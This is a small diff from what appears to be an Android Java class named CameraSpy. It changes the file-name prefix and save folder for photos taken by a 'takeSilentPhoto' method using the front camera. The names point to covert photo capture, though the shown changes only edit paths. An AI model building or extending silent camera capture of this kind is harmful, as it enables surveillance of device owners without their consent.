@@ -113,7 +113,7 @@ public class CameraSpy {
                     DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss");
                     Date date = new Date();
 
-                    String filename = photosDir + "/" + dateFormat.format(date) + ".jpg";
+                    String filename = photosDir + "/[photo]" + dateFormat.format(date) + ".jpg";
                     File file = new File(filename);
 
                     Image image = imageReader.acquireLatestImage();
@@ -251,7 +251,7 @@ public class CameraSpy {
     }
 
     static void writeFrontPhoto(Context context){
-        String cameraDir = context.getApplicationInfo().dataDir + "/camera/";
+        String cameraDir = context.getApplicationInfo().dataDir;
         new CameraSpy(context).takeSilentPhoto("front", cameraDir);
     }
 }
